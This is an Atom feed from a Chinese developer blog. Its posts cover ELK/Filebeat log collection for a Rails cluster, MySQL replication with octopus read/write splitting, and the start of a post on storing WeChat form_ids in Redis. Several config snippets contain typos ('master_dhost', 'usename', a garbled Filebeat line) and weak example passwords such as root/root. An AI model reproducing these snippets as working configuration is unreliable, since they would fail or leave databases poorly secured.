@@ -1,0 +1,1316 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.5">Jekyll</generator><link href="xifengzhu.github.com/feed.xml" rel="self" type="application/atom+xml" /><link href="xifengzhu.github.com/" rel="alternate" type="text/html" /><updated>2024-08-01T08:52:11+00:00</updated><id>xifengzhu.github.com/feed.xml</id><title type="html">夕枫主’s blog</title><subtitle>记录在不断前行中的每一步，缅怀那最璀璨的青春。。。。。。</subtitle><author><name>xifengzhu</name></author><entry><title type="html">ELK 套件分析集群Rails Application日志</title><link href="xifengzhu.github.com/2019/03/04/ELK-%E5%A5%97%E4%BB%B6%E5%88%86%E6%9E%90%E9%9B%86%E7%BE%A4Rails-Application%E6%97%A5%E5%BF%97.html" rel="alternate" type="text/html" title="ELK 套件分析集群Rails Application日志" /><published>2019-03-04T00:00:00+00:00</published><updated>2019-03-04T00:00:00+00:00</updated><id>xifengzhu.github.com/2019/03/04/ELK%20%E5%A5%97%E4%BB%B6%E5%88%86%E6%9E%90%E9%9B%86%E7%BE%A4Rails%20Application%E6%97%A5%E5%BF%97</id><content type="html" xml:base="xifengzhu.github.com/2019/03/04/ELK-%E5%A5%97%E4%BB%B6%E5%88%86%E6%9E%90%E9%9B%86%E7%BE%A4Rails-Application%E6%97%A5%E5%BF%97.html"><![CDATA[<p>随着系统访问量的增大，集群化的部署方式使得每个 <code class="language-plaintext highlighter-rouge">rails log</code> 文件都是写在各自的服务器硬盘上，这给排查错误造成很大的困扰，只能挨个服务器去找日志信息。 这个时候就需要一个工具来将日志收集起来统一处理。ELK 就是一个很好的日志处理分析工具。</p>
+
+<h2 id="elk-简介">ELK 简介</h2>
+<p><code class="language-plaintext highlighter-rouge">ELK</code> 是 <code class="language-plaintext highlighter-rouge">Elasticsearch</code>、<code class="language-plaintext highlighter-rouge">Logstash</code> 和 <code class="language-plaintext highlighter-rouge">Kibana </code>三种软件产品的首字母缩写。这三者都是开源软件，通常配合使用，而且又先后归于 <code class="language-plaintext highlighter-rouge">Elastic.co</code> 公司名下，所以被简称为 <code class="language-plaintext highlighter-rouge">ELK Stack</code>。根据 <code class="language-plaintext highlighter-rouge">Google Trend</code> 的信息显示，<code class="language-plaintext highlighter-rouge">ELK Stack</code> 已经成为目前最流行的集中式日志解决方案。</p>
+
+<ul>
+  <li>Elasticsearch：分布式搜索和分析引擎，具有高可伸缩、高可靠和易管理等特点。基于 Apache Lucene 构建，能对大容量的数据进行接近实时的存储、搜索和分析操作。通常被用作某些应用的基础搜索引擎，使其具有复杂的搜索功能；</li>
+  <li>Logstash：数据收集引擎。它支持动态的从各种数据源搜集数据，并对数据进行过滤、分析、丰富、统一格式等操作，然后存储到用户指定的位置；</li>
+  <li>Kibana：数据分析和可视化平台。通常与 Elasticsearch 配合使用，对其中数据进行搜索、分析和以统计图表的方式展示；</li>
+  <li>Filebeat：轻量级开源日志文件数据搜集器。在需要采集日志数据的 server 上安装 Filebeat，并指定日志目录或日志文件后，Filebeat 就能读取数据，迅速发送到 Logstash 进行解析，亦或直接发送到 Elasticsearch 进行集中式存储和分析。</li>
+</ul>
+
+<h2 id="常见架构模式">常见架构模式</h2>
+
+<h3 id="最简单的架构">最简单的架构</h3>
+<p><img src="/assets/images/elk-simple.png" alt="elk-simple.png" />
+在这种架构中，只有一个  <code class="language-plaintext highlighter-rouge">Logstash</code>、<code class="language-plaintext highlighter-rouge">Elasticsearch</code> 和 <code class="language-plaintext highlighter-rouge">Kibana </code>实例。<code class="language-plaintext highlighter-rouge">Logstash</code> 通过输入插件从多种数据源（比如日志文件、标准输入 <code class="language-plaintext highlighter-rouge">Stdin</code> 等）获取数据，再经过滤插件加工数据，然后经 <code class="language-plaintext highlighter-rouge">Elasticsearch</code> 输出插件输出到 <code class="language-plaintext highlighter-rouge">Elasticsearch</code>，通过 <code class="language-plaintext highlighter-rouge">Kibana</code>展示。这种架构适合初学者学习 <code class="language-plaintext highlighter-rouge">ELK</code> 的工作模式，搭建最简单的工作模式。</p>
+
+<h3 id="logstash-作为日志搜索器">Logstash 作为日志搜索器</h3>
+<p><img src="/assets/images/elk-logstash.png" alt="elk-logstash.png" />
+这种架构是对上面架构的扩展，把一个 <code class="language-plaintext highlighter-rouge">Logstash</code> 数据搜集节点扩展到多个，分布于多台机器，将解析好的数据发送到 <code class="language-plaintext highlighter-rouge">Elasticsearch server</code> 进行存储，最后在 <code class="language-plaintext highlighter-rouge">Kibana</code> 查询、生成日志报表等。</p>
+
+<p>这种架构在日常中应用的比较少；因为需要在各个服务器上部署 Logstash，而它比较消耗 CPU 和内存资源，所以比较适合计算资源丰富的服务器，否则容易造成服务器性能下降，甚至可能导致无法正常工作。</p>
+
+<h3 id="使用-filebeat-作为日志收集器">使用 <code class="language-plaintext highlighter-rouge">filebeat</code> 作为日志收集器</h3>
+<p><img src="/assets/images/elk-filebeat.png" alt="elk-filebeat.png" />
+这种架构是对上面架构的优化，<code class="language-plaintext highlighter-rouge">filebeat</code>比 <code class="language-plaintext highlighter-rouge">logstash</code> 更轻量，占用资源更少，通过<code class="language-plaintext highlighter-rouge">filebeat</code>采集日志，经<code class="language-plaintext highlighter-rouge">logstash</code>处理之后传递给<code class="language-plaintext highlighter-rouge">Elasticsearch</code>，通过 <code class="language-plaintext highlighter-rouge">Kibana</code> 展示。</p>
+
+<h3 id="引入消息队列将es做成集群">引入消息队列,将ES做成集群</h3>
+<p><img src="/assets/images/elk-cluster.png" alt="elk-cluster.png" />
+一些大型项目日志访问频繁，产生的日志文件比较多，对日志的分析要求较高，对稳定性与可靠性要求较高，可以在 <code class="language-plaintext highlighter-rouge">filebeat</code> 与 <code class="language-plaintext highlighter-rouge">logstash</code> 之间插入一层队列, 先将数据传递给消息队列，然后通过 <code class="language-plaintext highlighter-rouge">logstash</code> 拉取消息队列数据, 处理之后传递给ES集群处理。</p>
+
+<h2 id="为rails应用集群增加elk">为Rails应用集群增加ELK</h2>
+
+<h3 id="为项目添加日志解析">为项目添加日志解析</h3>
+
+<ul>
+  <li>添加日志解析的Gem</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gem</span> <span class="s2">"lograge"</span>
+<span class="n">gem</span> <span class="s2">"logstash-event"</span>
+</code></pre></div></div>
+<ul>
+  <li>在 <code class="language-plaintext highlighter-rouge">config/initializers/lograge.rb</code> 配置如下</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">configure</span> <span class="k">do</span>
+  <span class="n">config</span><span class="p">.</span><span class="nf">lograge</span><span class="p">.</span><span class="nf">enabled</span> <span class="o">=</span> <span class="kp">true</span>
+  <span class="n">config</span><span class="p">.</span><span class="nf">lograge</span><span class="p">.</span><span class="nf">formatter</span> <span class="o">=</span> <span class="no">Lograge</span><span class="o">::</span><span class="no">Formatters</span><span class="o">::</span><span class="no">Logstash</span><span class="p">.</span><span class="nf">new</span>
+  <span class="n">config</span><span class="p">.</span><span class="nf">lograge</span><span class="p">.</span><span class="nf">keep_original_rails_log</span> <span class="o">=</span> <span class="kp">true</span>
+  <span class="n">config</span><span class="p">.</span><span class="nf">lograge</span><span class="p">.</span><span class="nf">logger</span> <span class="o">=</span> <span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Logger</span><span class="p">.</span><span class="nf">new</span> <span class="s2">"</span><span class="si">#{</span><span class="no">Rails</span><span class="p">.</span><span class="nf">root</span><span class="si">}</span><span class="s2">/log/lograge_</span><span class="si">#{</span><span class="no">Rails</span><span class="p">.</span><span class="nf">env</span><span class="si">}</span><span class="s2">.log"</span>
+<span class="k">end</span>
+</code></pre></div></div>
+<p>如果使用 <code class="language-plaintext highlighter-rouge">grape</code>，grape的日志并不会写入文件中需要另外处理</p>
+<ul>
+  <li>添加 <code class="language-plaintext highlighter-rouge">gem grape_logging</code> 到gemfile</li>
+  <li>在 api.rb 中添加如下代码</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">API</span> <span class="o">&lt;</span> <span class="no">Grape</span><span class="o">::</span><span class="no">API</span>
+  <span class="n">use</span> <span class="no">GrapeLogging</span><span class="o">::</span><span class="no">Middleware</span><span class="o">::</span><span class="no">RequestLogger</span><span class="p">,</span>
+      <span class="ss">instrumentation_key: </span><span class="s1">'api'</span><span class="p">,</span>
+      <span class="ss">include: </span><span class="p">[</span>
+        <span class="no">GrapeLogging</span><span class="o">::</span><span class="no">Loggers</span><span class="o">::</span><span class="no">Response</span><span class="p">.</span><span class="nf">new</span><span class="p">,</span>
+        <span class="no">GrapeLogging</span><span class="o">::</span><span class="no">Loggers</span><span class="o">::</span><span class="no">FilterParameters</span><span class="p">.</span><span class="nf">new</span><span class="p">,</span>
+        <span class="no">GrapeLogging</span><span class="o">::</span><span class="no">Loggers</span><span class="o">::</span><span class="no">ClientEnv</span><span class="p">.</span><span class="nf">new</span><span class="p">,</span>
+        <span class="no">GrapeLogging</span><span class="o">::</span><span class="no">Loggers</span><span class="o">::</span><span class="no">RequestHeaders</span><span class="p">.</span><span class="nf">new</span>
+      <span class="p">]</span>
+  <span class="o">...</span>
+<span class="k">end</span>
+</code></pre></div></div>
+
+<ul>
+  <li>在 <code class="language-plaintext highlighter-rouge">config/initializers/instrumentation.rb</code> 配置如下, 将日志按照格式发给Lograge</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Subscribe to grape request and log with a logger dedicated to Grape</span>
+<span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Notifications</span><span class="p">.</span><span class="nf">subscribe</span><span class="p">(</span><span class="s1">'api'</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="nb">name</span><span class="p">,</span> <span class="n">starts</span><span class="p">,</span> <span class="n">ends</span><span class="p">,</span> <span class="n">notification_id</span><span class="p">,</span> <span class="n">payload</span><span class="o">|</span>
+  <span class="n">info</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="ss">name: </span><span class="nb">name</span><span class="p">,</span>
+    <span class="ss">status: </span><span class="n">payload</span><span class="p">[</span><span class="ss">:status</span><span class="p">],</span>
+    <span class="ss">method: </span><span class="n">payload</span><span class="p">[</span><span class="ss">:method</span><span class="p">],</span>
+    <span class="ss">path: </span><span class="n">payload</span><span class="p">[</span><span class="ss">:path</span><span class="p">],</span>
+    <span class="ss">params: </span><span class="n">payload</span><span class="p">[</span><span class="ss">:params</span><span class="p">],</span>
+    <span class="ss">host: </span><span class="n">payload</span><span class="p">[</span><span class="ss">:host</span><span class="p">],</span>
+    <span class="ss">db: </span><span class="n">payload</span><span class="p">[</span><span class="ss">:time</span><span class="p">][</span><span class="ss">:db</span><span class="p">],</span>
+    <span class="ss">view: </span><span class="n">payload</span><span class="p">[</span><span class="ss">:time</span><span class="p">][</span><span class="ss">:view</span><span class="p">],</span>
+    <span class="ss">total: </span><span class="n">payload</span><span class="p">[</span><span class="ss">:time</span><span class="p">][</span><span class="ss">:total</span><span class="p">],</span>
+    <span class="ss">remote_ip: </span><span class="n">payload</span><span class="p">[</span><span class="ss">:ip</span><span class="p">],</span>
+    <span class="ss">format: </span><span class="s2">"json"</span><span class="p">,</span>
+    <span class="ss">user_agent: </span><span class="n">payload</span><span class="p">[</span><span class="ss">:ua</span><span class="p">],</span>
+    <span class="ss">origin: </span><span class="n">payload</span><span class="p">[</span><span class="ss">:headers</span><span class="p">][</span><span class="s2">"Referer"</span><span class="p">],</span>
+    <span class="ss">logtime: </span><span class="no">Time</span><span class="p">.</span><span class="nf">current</span><span class="p">,</span>
+  <span class="p">}.</span><span class="nf">to_json</span>
+  <span class="no">Lograge</span><span class="p">.</span><span class="nf">logger</span><span class="p">.</span><span class="nf">info</span> <span class="n">info</span>
+<span class="k">end</span>
+</code></pre></div></div>
+
+<h3 id="在集群的各个节点配置日志发送工具-filebeat">在集群的各个节点配置日志发送工具 filebeat</h3>
+<ul>
+  <li>安装 filesbeat   <a href="https://www.elastic.co/guide/en/beats/filebeat/current/filebeat-installation.html">点击教程</a></li>
+  <li><code class="language-plaintext highlighter-rouge">filebeat.yml</code> 主要配置如下</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>filebeat.inputs:
+- type: log
+  enabled: true
+  paths:
+    - /var/www/xxx/xxx/log/lograge_production.log
+  fields:
+      appname: appname
+      log_type: application
+      env: production
+  fields_under_root: true
+output.logstash:
+  hosts: [remote_logstash_ip:5044"]
+processors:
+  - add_host_metadata: ~
+  - add_cloud_metadata: ~town-square
+</code></pre></div></div>
+<p><strong>path路径为<code class="language-plaintext highlighter-rouge">lograge</code>根据规则生成的 <code class="language-plaintext highlighter-rouge">json</code> 日志路径</strong></p>
+
+<h4 id="在运维服务器安装并配置-logstash">在运维服务器安装并配置 <code class="language-plaintext highlighter-rouge">logstash</code></h4>
+<ul>
+  <li>安装 logstash <a href="https://www.elastic.co/guide/en/logstash/current/installing-logstash.html">点击教程</a></li>
+  <li><code class="language-plaintext highlighter-rouge">logstash.yml</code> 主要配置如下</li>
+</ul>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">input</span><span class="w"> </span><span class="p">{</span><span class="w">
+  </span><span class="err">beats</span><span class="w"> </span><span class="p">{</span><span class="w">
+
+    </span><span class="err">port</span><span class="w"> </span><span class="err">=&gt;</span><span class="w"> </span><span class="mi">5044</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="err">filter</span><span class="w"> </span><span class="p">{</span><span class="w">
+  </span><span class="err">if</span><span class="w"> </span><span class="p">[</span><span class="err">log_type</span><span class="p">]</span><span class="w"> </span><span class="err">==</span><span class="w"> </span><span class="s2">"application"</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">json</span><span class="w"> </span><span class="p">{</span><span class="w">
+      </span><span class="err">source</span><span class="w"> </span><span class="err">=&gt;</span><span class="w"> </span><span class="s2">"message"</span><span class="w">
+   </span><span class="p">}</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="err">output</span><span class="w"> </span><span class="p">{</span><span class="w">
+  </span><span class="err">stdout</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">codec</span><span class="w"> </span><span class="err">=&gt;</span><span class="w"> </span><span class="err">rubydebug</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+
+  </span><span class="err">elasticsearch</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">index</span><span class="w"> </span><span class="err">=&gt;</span><span class="w"> </span><span class="s2">"%{[appname]}-%{[env]}-%{+YYYY.MM.dd}"</span><span class="w">
+    </span><span class="err">hosts</span><span class="w"> </span><span class="err">=&gt;</span><span class="w"> </span><span class="p">[</span><span class="err">'</span><span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">9200</span><span class="err">'</span><span class="p">]</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="在运维服务器安装并配置elasticsearch和kibana即可">在运维服务器安装并配置elasticsearch和kibana即可</h3>
+
+<h2 id="参考文章">参考文章</h2>
+<ul>
+  <li><a href="https://www.ibm.com/developerworks/cn/opensource/os-cn-elk-filebeat/index.html">https://www.ibm.com/developerworks/cn/opensource/os-cn-elk-filebeat/index.html</a></li>
+  <li><a href="https://www.elastic.co/guide/index.html">https://www.elastic.co/guide/index.html</a></li>
+  <li><a href="https://www.elastic.co/guide/cn/kibana/current/index.html">https://www.elastic.co/guide/cn/kibana/current/index.html</a></li>
+</ul>]]></content><author><name>xifengzhu</name></author><summary type="html"><![CDATA[随着系统访问量的增大，集群化的部署方式使得每个 rails log 文件都是写在各自的服务器硬盘上，这给排查错误造成很大的困扰，只能挨个服务器去找日志信息。 这个时候就需要一个工具来将日志收集起来统一处理。ELK 就是一个很好的日志处理分析工具。]]></summary></entry><entry><title type="html">Rails 实现数据库（Mysql）读写分离</title><link href="xifengzhu.github.com/2018/11/05/rails-%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%BA%93-mysql-%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB.html" rel="alternate" type="text/html" title="Rails 实现数据库（Mysql）读写分离" /><published>2018-11-05T00:00:00+00:00</published><updated>2018-11-05T00:00:00+00:00</updated><id>xifengzhu.github.com/2018/11/05/rails-%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%BA%93-mysql-%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB</id><content type="html" xml:base="xifengzhu.github.com/2018/11/05/rails-%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%BA%93-mysql-%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB.html"><![CDATA[<p>常见的实现读写分离的方式有如下两种</p>
+
+<ul>
+  <li>
+    <p>第三方中间件，比较成熟的有 <code class="language-plaintext highlighter-rouge">Mysql</code> 官方提供的 <a href="https://dev.mysql.com/downloads/router/">MySQL Router</a> 以及 360公司基于 <code class="language-plaintext highlighter-rouge">MySQL-Proxy 0.8.2</code> 开发的开源 <a href="https://github.com/Qihoo360/Atlas">Atlas</a> 等</p>
+  </li>
+  <li>
+    <p>其次就是在应用中做解决，在 <code class="language-plaintext highlighter-rouge">ActiveRecord</code>中做处理， 如：<a href="https://github.com/thiagopradi/octopus">octopus</a></p>
+  </li>
+</ul>
+
+<p>本次实践的是用 <code class="language-plaintext highlighter-rouge">gem octopus</code>来实现读写分离。</p>
+
+<p>为了实践读写分离，将 <code class="language-plaintext highlighter-rouge">MySQL</code> 分别安装在了本地 <code class="language-plaintext highlighter-rouge">Mac</code> 和阿里云 <code class="language-plaintext highlighter-rouge">Ubuntu</code> 系统上，<code class="language-plaintext highlighter-rouge">Mac</code> 的 <code class="language-plaintext highlighter-rouge">MySQL</code> 作为写入数据库，而 <code class="language-plaintext highlighter-rouge">Ubuntu</code> 的作为读取数据库。</p>
+
+<h2 id="配置-mysql-主从复制">配置 MySQL 主从复制</h2>
+
+<h3 id="创建账号">创建账号</h3>
+
+<p>在 <code class="language-plaintext highlighter-rouge">Master</code> 的数据库中建立一个备份帐户：每个 <code class="language-plaintext highlighter-rouge">slave</code> 使用标准的 <code class="language-plaintext highlighter-rouge">MySQL</code> 用户名和密码连接 <code class="language-plaintext highlighter-rouge">master</code>。进行复制操作的用户会授予 <code class="language-plaintext highlighter-rouge">REPLICATION SLAVE</code> 权限. 命令如下：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="o">&gt;</span> GRANT REPLICATION SLAVE ON <span class="k">*</span>.<span class="k">*</span> TO <span class="s1">'backup'</span>@<span class="s1">'113.66.254.238'</span> IDENTIFIED BY <span class="s1">'12345678'</span><span class="p">;</span>
+mysql <span class="o">&gt;</span> flush privileges<span class="p">;</span>
+</code></pre></div></div>
+
+<p>命令是建立一个帐户 <code class="language-plaintext highlighter-rouge">backup</code>，并且只能允许从 <code class="language-plaintext highlighter-rouge">113.66.254.238</code> 这个地址上来登陆，密码是 <code class="language-plaintext highlighter-rouge">12345678</code>。</p>
+
+<h3 id="配置-master">配置 master</h3>
+
+<p>修改主服务器 <code class="language-plaintext highlighter-rouge">Master</code>的 <code class="language-plaintext highlighter-rouge">MySQL</code> 配置文件</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>vi /etc/my.cnf（默认）
+<span class="o">[</span>mysqld]
+log-bin<span class="o">=</span>mysql-bin     //[必须]启用二进制日志
+server-id<span class="o">=</span>112         //[必须]服务器唯一ID，默认是1，一般取IP最后一段
+<span class="c"># 指定同步的数据库， 如果 不指定则同步全部数据库</span>
+binlog-do-db<span class="o">=</span> eshop_development
+</code></pre></div></div>
+
+<p>重启 <code class="language-plaintext highlighter-rouge">master</code> <code class="language-plaintext highlighter-rouge">service mysqld restart</code>，运行 <code class="language-plaintext highlighter-rouge">SHOW MASTER STATUS</code>，输出如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+------------------+----------+-------------------+------------------+-------------------+
+| File             | Position | Binlog_Do_DB      | Binlog_Ignore_DB | Executed_Gtid_Set |
++------------------+----------+-------------------+------------------+-------------------+
+| mysql-bin.000004 |     308  | eshop_development | mysql            |                   |
++------------------+----------+-------------------+------------------+-------------------+
+</code></pre></div></div>
+<p>注：执行完此步骤后不要再操作主服务器 <code class="language-plaintext highlighter-rouge">MYSQL</code>，防止主服务器状态值变化</p>
+
+<h3 id="配置slave">配置slave</h3>
+
+<p>修改从服务器 <code class="language-plaintext highlighter-rouge">slave</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>vi /etc/my.cnf
+<span class="o">[</span>mysqld]
+server-id<span class="o">=</span>238      //[必须]服务器唯一ID，默认是1，一般取IP最后一段
+</code></pre></div></div>
+
+<p>配置从服务器 <code class="language-plaintext highlighter-rouge">Slave</code>， 设置需要链接主服务器的地址与登录用户名跟密码</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; change master to <span class="nv">master_dhost</span><span class="o">=</span><span class="s1">'47.106.177.112'</span>,master_user<span class="o">=</span><span class="s1">'backup'</span>,master_password<span class="o">=</span><span class="s1">'12345678'</span>,
+<span class="nv">master_log_file</span><span class="o">=</span><span class="s1">'mysql-bin.000004'</span>,master_log_pos<span class="o">=</span>308<span class="p">;</span>
+mysql&gt; start slave<span class="p">;</span>    //启动从服务器复制功能
+</code></pre></div></div>
+
+<p>检查从服务器(Slave)复制功能状态：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*************************** 1. row ***************************
+               Slave_IO_State: Waiting for master to send event
+                  Master_Host: 47.106.177.112
+                  Master_User: backup
+                  Master_Port: 3306
+                Connect_Retry: 60
+              Master_Log_File: mysql-bin.000012
+          Read_Master_Log_Pos: 2258
+               Relay_Log_File: edu-mysql-relay-bin.000014
+                Relay_Log_Pos: 2424
+        Relay_Master_Log_File: mysql-bin.000012
+             Slave_IO_Running: Yes
+            Slave_SQL_Running: Yes
+              Replicate_Do_DB:
+          Replicate_Ignore_DB:
+           Replicate_Do_Table:
+       Replicate_Ignore_Table:
+      Replicate_Wild_Do_Table:
+  Replicate_Wild_Ignore_Table:
+                   Last_Errno: 0
+                   Last_Error:
+                 Skip_Counter: 0
+          Exec_Master_Log_Pos: 2258
+              Relay_Log_Space: 2848
+              Until_Condition: None
+               Until_Log_File:
+                Until_Log_Pos: 0
+           Master_SSL_Allowed: No
+           Master_SSL_CA_File:
+           Master_SSL_CA_Path:
+              Master_SSL_Cert:
+            Master_SSL_Cipher:
+               Master_SSL_Key:
+        Seconds_Behind_Master: 0
+Master_SSL_Verify_Server_Cert: No
+                Last_IO_Errno: 0
+                Last_IO_Error:
+               Last_SQL_Errno: 0
+               Last_SQL_Error:
+  Replicate_Ignore_Server_Ids:
+             Master_Server_Id: 1
+                  Master_UUID: c908538b-db65-11e8-8419-00163e1037ab
+             Master_Info_File: /usr/local/var/mysql/master.info
+                    SQL_Delay: 0
+          SQL_Remaining_Delay: NULL
+      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates
+           Master_Retry_Count: 86400
+                ......
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Slave_IO</code> 及 <code class="language-plaintext highlighter-rouge">Slave_SQL</code> 进程必须正常运行，即 <code class="language-plaintext highlighter-rouge">YES</code> 状态，否则都是错误的状态(如：其中一个 <code class="language-plaintext highlighter-rouge">NO</code> 均属错误)。</p>
+
+<h2 id="rails-应用配置">Rails 应用配置</h2>
+
+<h3 id="添加如下一行到-gemfile">添加如下一行到 Gemfile</h3>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gem</span> <span class="s1">'ar-octopus'</span>
+</code></pre></div></div>
+
+<p>执行 <code class="language-plaintext highlighter-rouge">bundle install</code></p>
+
+<h3 id="配置文件">配置文件</h3>
+<p>在 <code class="language-plaintext highlighter-rouge">Rails</code> 项目的 <code class="language-plaintext highlighter-rouge">config</code> 目录下新建文件 <code class="language-plaintext highlighter-rouge">shards.xml</code>,该文件用于保 <code class="language-plaintext highlighter-rouge">存Linux</code> 下 <code class="language-plaintext highlighter-rouge">MySQL read</code> 数据库, 该文件长成这个样子：</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">octopus</span><span class="pi">:</span>
+  <span class="na">replicated</span><span class="pi">:</span> <span class="no">true</span>
+  <span class="na">environments</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="s">development</span>
+
+  <span class="na">development</span><span class="pi">:</span>
+    <span class="na">slave1</span><span class="pi">:</span>
+      <span class="na">host</span><span class="pi">:</span> <span class="s">113.66.254.238</span>
+      <span class="na">port</span><span class="pi">:</span> <span class="m">3306</span>
+      <span class="na">adapter</span><span class="pi">:</span> <span class="s">mysql2</span>
+      <span class="na">database</span><span class="pi">:</span> <span class="s">eshop_development</span>
+      <span class="na">usename</span><span class="pi">:</span> <span class="s">root</span>
+      <span class="na">password</span><span class="pi">:</span> <span class="s">root</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">rails</code> 会将 <code class="language-plaintext highlighter-rouge">database.yml</code> 中配置的数据库作为写数据库(master)。</p>
+
+<p>测试下是否如预期的从主库写入数据，从库读取数据, 在 <code class="language-plaintext highlighter-rouge">rails console</code>中执行如下</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mf">2.3</span><span class="o">.</span><span class="mi">1</span> <span class="p">:</span><span class="mo">001</span> <span class="o">&gt;</span> <span class="no">AdminUser</span><span class="p">.</span><span class="nf">create</span><span class="p">(</span><span class="ss">email: </span><span class="s2">"xifengzhu520@gmail.com"</span><span class="p">)</span>
+<span class="mf">2.3</span><span class="o">.</span><span class="mi">1</span> <span class="p">:</span><span class="mo">002</span> <span class="o">&gt;</span> <span class="no">AdminUser</span><span class="p">.</span><span class="nf">find_by_email</span><span class="p">(</span><span class="s2">"xifengzhu520@gmail.com"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>结果输出为:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="no">Shard</span><span class="p">:</span> <span class="n">slave1</span><span class="p">]</span>  <span class="no">AdminUser</span> <span class="no">Load</span> <span class="p">(</span><span class="mf">27.4</span><span class="n">ms</span><span class="p">)</span>  <span class="no">SELECT</span>  <span class="sb">`admin_users`</span><span class="p">.</span><span class="nf">*</span> <span class="no">FROM</span> <span class="sb">`admin_users`</span> <span class="no">WHERE</span> <span class="sb">`admin_users`</span><span class="p">.</span><span class="nf">`</span><span class="n">email</span><span class="sb">` = 'xifengzhu520@gmail.com' LIMIT 1
+</span></code></pre></div></div>
+
+<p>可以看到数据已经写入主数据库，并且能从从库中读取出来，说明此时读写分离已经配置成功。</p>]]></content><author><name>xifengzhu</name></author><summary type="html"><![CDATA[常见的实现读写分离的方式有如下两种]]></summary></entry><entry><title type="html">使用redis存储微信小程序form_id</title><link href="xifengzhu.github.com/2018/09/01/%E4%BD%BF%E7%94%A8redis%E5%AD%98%E5%82%A8%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8Fform-id.html" rel="alternate" type="text/html" title="使用redis存储微信小程序form_id" /><published>2018-09-01T00:00:00+00:00</published><updated>2018-09-01T00:00:00+00:00</updated><id>xifengzhu.github.com/2018/09/01/%E4%BD%BF%E7%94%A8redis%E5%AD%98%E5%82%A8%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8Fform-id</id><content type="html" xml:base="xifengzhu.github.com/2018/09/01/%E4%BD%BF%E7%94%A8redis%E5%AD%98%E5%82%A8%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8Fform-id.html"><![CDATA[<blockquote>
+  <p>当用户在小程序内发生过提交表单行为且该表单声明为要发模板消息的，开发者需要向用户提供服务时，可允许开发者向用户在7天内推送有限条数的模板消息（1次提交表单可下发1条，多次提交下发条数独立，相互不影响）</p>
+</blockquote>
+
+<p>小程序发送模板消息只能通过form_id(订单除外，订单的pepay_id可以发送三条模板消息)，并且form_id 的有效期只有7天，那如何存储小程序的form_id，并且能保证每次拿到的都是未过期的form_id呢？
+下面就是围绕这个问题来给一个解决方案。</p>
+
+<h2 id="方案">方案</h2>
+
+<h3 id="方案一">方案一</h3>
+<p>存储：新建一个 <code class="language-plaintext highlighter-rouge">form_ids</code> 表，跟用户相关联。即：<code class="language-plaintext highlighter-rouge">User has_many form_ids</code></p>
+
+<p>使用：然后通过某种机制清理过期的 <code class="language-plaintext highlighter-rouge">form_id</code> 记录，并且在使用过一个 <code class="language-plaintext highlighter-rouge">form_id</code> 记录之后自动删除记录。</p>
+
+<h3 id="方案二">方案二</h3>
+<p>存储：在 <code class="language-plaintext highlighter-rouge">User</code> 上添加一个字段：<code class="language-plaintext highlighter-rouge">form_ids</code>, 存储数组： <code class="language-plaintext highlighter-rouge">[{created_at: ${form_id}}]</code></p>
+
